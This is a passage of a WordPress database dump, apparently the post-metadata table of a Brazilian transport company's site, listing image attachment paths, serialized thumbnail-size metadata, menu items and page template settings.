(128, 43, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:250;s:6:\"height\";i:100;s:4:\"file\";s:36:\"2015/03/Logo-Araujo-Transportes2.png\";s:5:\"sizes\";a:2:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:36:\"Logo-Araujo-Transportes2-150x100.png\";s:5:\"width\";i:150;s:6:\"height\";i:100;s:9:\"mime-type\";s:9:\"image/png\";}s:26:\"featured-blog-medium-small\";a:4:{s:4:\"file\";s:36:\"Logo-Araujo-Transportes2-230x100.png\";s:5:\"width\";i:230;s:6:\"height\";i:100;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(129, 44, '_wp_attached_file', '2015/03/fiorinos-araujo.png'),
(130, 44, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:1268;s:6:\"height\";i:400;s:4:\"file\";s:27:\"2015/03/fiorinos-araujo.png\";s:5:\"sizes\";a:7:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:27:\"fiorinos-araujo-150x150.png\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:9:\"image/png\";}s:6:\"medium\";a:4:{s:4:\"file\";s:26:\"fiorinos-araujo-300x95.png\";s:5:\"width\";i:300;s:6:\"height\";i:95;s:9:\"mime-type\";s:9:\"image/png\";}s:5:\"large\";a:4:{s:4:\"file\";s:28:\"fiorinos-araujo-1024x323.png\";s:5:\"width\";i:1024;s:6:\"height\";i:323;s:9:\"mime-type\";s:9:\"image/png\";}s:19:\"featured-blog-large\";a:4:{s:4:\"file\";s:27:\"fiorinos-araujo-750x350.png\";s:5:\"width\";i:750;s:6:\"height\";i:350;s:9:\"mime-type\";s:9:\"image/png\";}s:20:\"featured-blog-medium\";a:4:{s:4:\"file\";s:27:\"fiorinos-araujo-270x270.png\";s:5:\"width\";i:270;s:6:\"height\";i:270;s:9:\"mime-type\";s:9:\"image/png\";}s:8:\"featured\";a:4:{s:4:\"file\";s:27:\"fiorinos-araujo-642x300.png\";s:5:\"width\";i:642;s:6:\"height\";i:300;s:9:\"mime-type\";s:9:\"image/png\";}s:26:\"featured-blog-medium-small\";a:4:{s:4:\"file\";s:27:\"fiorinos-araujo-230x230.png\";s:5:\"width\";i:230;s:6:\"height\";i:230;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(131, 45, '_wp_attached_file', '2015/03/encomenda-entregue.jpg'),
(132, 45, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:1268;s:6:\"height\";i:400;s:4:\"file\";s:30:\"2015/03/encomenda-entregue.jpg\";s:5:\"sizes\";a:7:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:30:\"encomenda-entregue-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:29:\"encomenda-entregue-300x95.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:95;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:31:\"encomenda-entregue-1024x323.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:323;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:19:\"featured-blog-large\";a:4:{s:4:\"file\";s:30:\"encomenda-entregue-750x350.jpg\";s:5:\"width\";i:750;s:6:\"height\";i:350;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:20:\"featured-blog-medium\";a:4:{s:4:\"file\";s:30:\"encomenda-entregue-270x270.jpg\";s:5:\"width\";i:270;s:6:\"height\";i:270;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:8:\"featured\";a:4:{s:4:\"file\";s:30:\"encomenda-entregue-642x300.jpg\";s:5:\"width\";i:642;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:26:\"featured-blog-medium-small\";a:4:{s:4:\"file\";s:30:\"encomenda-entregue-230x230.jpg\";s:5:\"width\";i:230;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(133, 46, '_edit_last', '1'),
(134, 46, 'spacious_page_layout', 'default_layout'),
(135, 46, '_wp_page_template', 'page-templates/business.php'),
(136, 46, '_edit_lock', '1454882507:1'),
(149, 64, '_wp_attached_file', '2015/03/1426735922_vector_65_12-128.png'),
(150, 64, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:128;s:6:\"height\";i:128;s:4:\"file\";s:39:\"2015/03/1426735922_vector_65_12-128.png\";s:5:\"sizes\";a:0:{}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(151, 66, '_wp_attached_file', '2015/03/1426736366_free-14-128.png'),
(152, 66, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:128;s:6:\"height\";i:128;s:4:\"file\";s:34:\"2015/03/1426736366_free-14-128.png\";s:5:\"sizes\";a:0:{}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(153, 68, '_wp_attached_file', '2015/03/1426736601_698368-icon-137-document-certificate-128.png'),
(154, 68, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:128;s:6:\"height\";i:128;s:4:\"file\";s:63:\"2015/03/1426736601_698368-icon-137-document-certificate-128.png\";s:5:\"sizes\";a:0:{}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(164, 83, '_menu_item_type', 'post_type'),
(165, 83, '_menu_item_menu_item_parent', '0'),
(166, 83, '_menu_item_object_id', '30'),
(167, 83, '_menu_item_object', 'page'),
(168, 83, '_menu_item_target', ''),
(169, 83, '_menu_item_classes', 'a:1:{i:0;s:0:\"\";}'),
(170, 83, '_menu_item_xfn', ''),
(171, 83, '_menu_item_url', ''),
(182, 85, '_edit_last', '1'),
(183, 85, 'spacious_page_layout', 'default_layout'),
(184, 85, '_wp_page_template', 'default'),
(185, 85, '_edit_lock', '1469910151:1'),
(186, 87, '_menu_item_type', 'post_type'),
(187, 87, '_menu_item_menu_item_parent', '0'),
(188, 87, '_menu_item_object_id', '85'),
(189, 87, '_menu_item_object', 'page'),
(190, 87, '_menu_item_target', ''),
(191, 87, '_menu_item_classes', 'a:1:{i:0;s:0:\"\";}'),
(192, 87, '_menu_item_xfn', ''),
(193, 87, '_menu_item_url', ''),
(195, 88, '_menu_item_type', 'post_type'),
(196, 88, '_menu_item_menu_item_parent', '0'),
(197, 88, '_menu_item_object_id', '85'),
(198, 88, '_menu_item_object', 'page'),
(199, 88, '_menu_item_target', ''),
(200, 88, '_menu_item_classes', 'a:1:{i:0;s:0:\"\";}'),
(201, 88, '_menu_item_xfn', ''),
(202, 88, '_menu_item_url', ''),
(204, 91, '_edit_last', '1'),
(205, 91, '_edit_lock', '1468246379:2'),
(206, 91, '_thumbnail_id', '64'),
(207, 91, 'spacious_page_layout', 'default_layout'),
(208, 91, '_wp_page_template', 'default'),
(209, 26, '_thumbnail_id', '68'),
(211, 96, '_edit_last', '1'),
(212, 96, '_edit_lock', '1444054664:2'),
(213, 96, '_thumbnail_id', '66'),
(214, 96, 'spacious_page_layout', 'default_layout'),
(215, 96, '_wp_page_template', 'default'),
(216, 98, '_menu_item_type', 'post_type'),
(217, 98, '_menu_item_menu_item_parent', '0'),
(218, 98, '_menu_item_object_id', '96'),
(219, 98, '_menu_item_object', 'page'),
(220, 98, '_menu_item_target', ''),
(221, 98, '_menu_item_classes', 'a:1:{i:0;s:0:\"\";}'),
(222, 98, '_menu_item_xfn', ''),
(223, 98, '_menu_item_url', ''),
(227, 110, '_wp_attached_file', '2015/03/HRS.jpg'),
(228, 110, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:1268;s:6:\"height\";i:400;s:4:\"file\";s:15:\"2015/03/HRS.jpg\";s:5:\"sizes\";a:7:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:15:\"HRS-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"HRS-300x95.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:95;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:16:\"HRS-1024x323.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:323;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:19:\"featured-blog-large\";a:4:{s:4:\"file\";s:15:\"HRS-750x350.jpg\";s:5:\"width\";i:750;s:6:\"height\";i:350;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:20:\"featured-blog-medium\";a:4:{s:4:\"file\";s:15:\"HRS-270x270.jpg\";s:5:\"width\";i:270;s:6:\"height\";i:270;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:8:\"featured\";a:4:{s:4:\"file\";s:15:\"HRS-642x300.jpg\";s:5:\"width\";i:642;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:26:\"featured-blog-medium-small\";a:4:{s:4:\"file\";s:15:\"HRS-230x230.jpg\";s:5:\"width\";i:230;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(229, 112, '_wp_attached_file', '2015/03/face.png'),
(230, 112, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:128;s:6:\"height\";i:128;s:4:\"file\";s:16:\"2015/03/face.png\";s:5:\"sizes\";a:0:{}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(231, 113, '_wp_attached_file', '2015/03/rss.png'),
(232, 113, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:128;s:6:\"height\";i:128;s:4:\"file\";s:15:\"2015/03/rss.png\";s:5:\"sizes\";a:0:{}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(233, 114, '_wp_attached_file', '2015/03/twitter.png'),
(234, 114, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:128;s:6:\"height\";i:128;s:4:\"file\";s:19:\"2015/03/twitter.png\";s:5:\"sizes\";a:0:{}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(237, 118, '_wp_attached_file', '2015/03/Logo-Araujo-Transportes.jpg'),
(238, 118, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:250;s:6:\"height\";i:100;s:4:\"file\";s:35:\"2015/03/Logo-Araujo-Transportes.jpg\";s:5:\"sizes\";a:2:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:35:\"Logo-Araujo-Transportes-150x100.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:100;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:26:\"featured-blog-medium-small\";a:4:{s:4:\"file\";s:35:\"Logo-Araujo-Transportes-230x100.jpg\";s:5:\"width\";i:230;s:6:\"height\";i:100;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(239, 119, '_wp_attached_file', '2015/03/Logo-Araujo-Transportes-2.png'),
(240, 119, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:250;s:6:\"height\";i:100;s:4:\"file\";s:37:\"2015/03/Logo-Araujo-Transportes-2.png\";s:5:\"sizes\";a:2:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:37:\"Logo-Araujo-Transportes-2-150x100.png\";s:5:\"width\";i:150;s:6:\"height\";i:100;s:9:\"mime-type\";s:9:\"image/png\";}s:26:\"featured-blog-medium-small\";a:4:{s:4:\"file\";s:37:\"Logo-Araujo-Transportes-2-230x100.png\";s:5:\"width\";i:230;s:6:\"height\";i:100;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(243, 121, '_wp_attached_file', '2015/04/Decesiva.jpg'),
(244, 121, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:300;s:6:\"height\";i:300;s:4:\"file\";s:20:\"2015/04/Decesiva.jpg\";s:5:\"sizes\";a:5:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:20:\"Decesiva-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:20:\"Decesiva-300x300.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:20:\"featured-blog-medium\";a:4:{s:4:\"file\";s:20:\"Decesiva-270x270.jpg\";s:5:\"width\";i:270;s:6:\"height\";i:270;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:8:\"featured\";a:4:{s:4:\"file\";s:20:\"Decesiva-300x300.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:26:\"featured-blog-medium-small\";a:4:{s:4:\"file\";s:20:\"Decesiva-230x230.jpg\";s:5:\"width\";i:230;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(245, 122, '_wp_attached_file', '2015/04/mandae.jpg'),
(246, 122, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:300;s:6:\"height\";i:300;s:4:\"file\";s:18:\"2015/04/mandae.jpg\";s:5:\"sizes\";a:5:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:18:\"mandae-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:18:\"mandae-300x300.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:20:\"featured-blog-medium\";a:4:{s:4:\"file\";s:18:\"mandae-270x270.jpg\";s:5:\"width\";i:270;s:6:\"height\";i:270;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:8:\"featured\";a:4:{s:4:\"file\";s:18:\"mandae-300x300.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:26:\"featured-blog-medium-small\";a:4:{s:4:\"file\";s:18:\"mandae-230x230.jpg\";s:5:\"width\";i:230;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(247, 123, '_wp_attached_file', '2015/04/phoenix.jpg'),
(248, 123, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:300;s:6:\"height\";i:300;s:4:\"file\";s:19:\"2015/04/phoenix.jpg\";s:5:\"sizes\";a:5:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:19:\"phoenix-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:19:\"phoenix-300x300.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:20:\"featured-blog-medium\";a:4:{s:4:\"file\";s:19:\"phoenix-270x270.jpg\";s:5:\"width\";i:270;s:6:\"height\";i:270;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:8:\"featured\";a:4:{s:4:\"file\";s:19:\"phoenix-300x300.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:26:\"featured-blog-medium-small\";a:4:{s:4:\"file\";s:19:\"phoenix-230x230.jpg\";s:5:\"width\";i:230;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(249, 124, '_wp_attached_file', '2015/04/via.jpg'),
(250, 124, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:300;s:6:\"height\";i:300;s:4:\"file\";s:15:\"2015/04/via.jpg\";s:5:\"sizes\";a:5:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:15:\"via-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:15:\"via-300x300.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:20:\"featured-blog-medium\";a:4:{s:4:\"file\";s:15:\"via-270x270.jpg\";s:5:\"width\";i:270;s:6:\"height\";i:270;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:8:\"featured\";a:4:{s:4:\"file\";s:15:\"via-300x300.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:26:\"featured-blog-medium-small\";a:4:{s:4:\"file\";s:15:\"via-230x230.jpg\";s:5:\"width\";i:230;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(251, 129, '_wp_attached_file', '2015/03/PHOTO.png'),
(252, 129, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:212;s:6:\"height\";i:220;s:4:\"file\";s:17:\"2015/03/PHOTO.png\";s:5:\"sizes\";a:1:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:17:\"PHOTO-150x150.png\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(253, 134, '_wp_attached_file', '2015/03/email.png'),
(254, 134, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:128;s:6:\"height\";i:128;s:4:\"file\";s:17:\"2015/03/email.png\";s:5:\"sizes\";a:0:{}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(255, 135, '_wp_attached_file', '2015/03/fale-conosco.png'),
(256, 135, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:128;s:6:\"height\";i:128;s:4:\"file\";s:24:\"2015/03/fale-conosco.png\";s:5:\"sizes\";a:0:{}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(257, 136, '_wp_attached_file', '2015/03/mapa.png'),
(258, 136, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:128;s:6:\"height\";i:128;s:4:\"file\";s:16:\"2015/03/mapa.png\";s:5:\"sizes\";a:0:{}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(259, 137, '_wp_attached_file', '2015/03/tele.png'),
(260, 137, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:128;s:6:\"height\";i:128;s:4:\"file\";s:16:\"2015/03/tele.png\";s:5:\"sizes\";a:0:{}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(261, 138, '_wp_attached_file', '2015/03/site.png'),
(262, 138, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:128;s:6:\"height\";i:128;s:4:\"file\";s:16:\"2015/03/site.png\";s:5:\"sizes\";a:0:{}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(263, 140, '_wp_attached_file', '2015/04/fiorinos-araujo-2.jpg'),
(264, 140, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:1268;s:6:\"height\";i:400;s:4:\"file\";s:29:\"2015/04/fiorinos-araujo-2.jpg\";s:5:\"sizes\";a:7:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:29:\"fiorinos-araujo-2-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:28:\"fiorinos-araujo-2-300x95.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:95;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:30:\"fiorinos-araujo-2-1024x323.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:323;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:19:\"featured-blog-large\";a:4:{s:4:\"file\";s:29:\"fiorinos-araujo-2-750x350.jpg\";s:5:\"width\";i:750;s:6:\"height\";i:350;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:20:\"featured-blog-medium\";a:4:{s:4:\"file\";s:29:\"fiorinos-araujo-2-270x270.jpg\";s:5:\"width\";i:270;s:6:\"height\";i:270;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:8:\"featured\";a:4:{s:4:\"file\";s:29:\"fiorinos-araujo-2-642x300.jpg\";s:5:\"width\";i:642;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:26:\"featured-blog-medium-small\";a:4:{s:4:\"file\";s:29:\"fiorinos-araujo-2-230x230.jpg\";s:5:\"width\";i:230;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(265, 141, '_wp_attached_file', '2015/04/logo-lateral.jpg'),
